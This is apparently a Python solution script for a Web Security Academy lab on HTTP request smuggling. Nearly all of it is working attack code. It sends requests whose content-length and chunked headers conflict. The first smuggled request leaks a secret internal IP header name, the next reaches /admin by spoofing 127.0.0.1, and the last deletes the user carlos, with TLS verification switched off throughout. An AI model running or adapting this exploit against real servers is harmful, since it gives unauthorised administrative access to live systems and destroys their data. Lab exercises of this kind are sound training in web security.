import time
import urllib.parse
import http.client
import ssl

LAB_ID = "???"


def POST_search(phrase: str) -> http.client.HTTPResponse:
    method, path = 'POST', '/'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
    }
    fields = [
        ('search', phrase),
    ]
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def POST_(smuggle: str, next_req_length: int) -> http.client.HTTPResponse:
    method, path = 'POST', '/'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'transfer-encoding': 'chunked',
    }
    body = f"0\r\n\r\n{smuggle}"
    headers['content-length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


lookup_len = 100
lookup_request = f"""POST / HTTP/1.1
content-type: application/x-www-form-urlencoded
content-length: {lookup_len}

search=""".replace("\n", "\r\n")

response = POST_(smuggle=lookup_request, next_req_length=lookup_len)
if response.status != 200:
    raise Exception(f"smuggling response status {response.status}")
response = POST_search('')
print("smuggling lookup response:")
print(f"status {response.status}")
for name, header in response.headers.items():
    print(f"{name}: {header}")
print(response.read().decode('utf-8'))

ip_header_name: str = input("input secret ip header name from the response: ")

admin_panel_request = f"""GET /admin HTTP/1.1
content-length: 20
{ip_header_name}: 127.0.0.1
content-type: application/x-www-form-urlencoded

x=""".replace("\n", "\r\n")

response = POST_(smuggle=admin_panel_request, next_req_length=lookup_len)
response = POST_search('')

print("admin panel response:")
print(f"status {response.status}")
for name, header in response.headers.items():
    print(f"{name}: {header}")
print(response.read().decode('utf-8'))

print(f"path to delete user carlos: /admin/delete?username=carlos")
input("hit enter to agree ")

deletion_request = f"""GET /admin/delete?username=carlos HTTP/1.1
content-length: 20
{ip_header_name}: 127.0.0.1
content-type: application/x-www-form-urlencoded

x=""".replace("\n", "\r\n")

response = POST_(smuggle=deletion_request, next_req_length=lookup_len)
response = POST_search('')
print("deletion response:")
print(f"status {response.status}")
for name, header in response.headers.items():
    print(f"{name}: {header}")
print(response.read().decode('utf-8'))
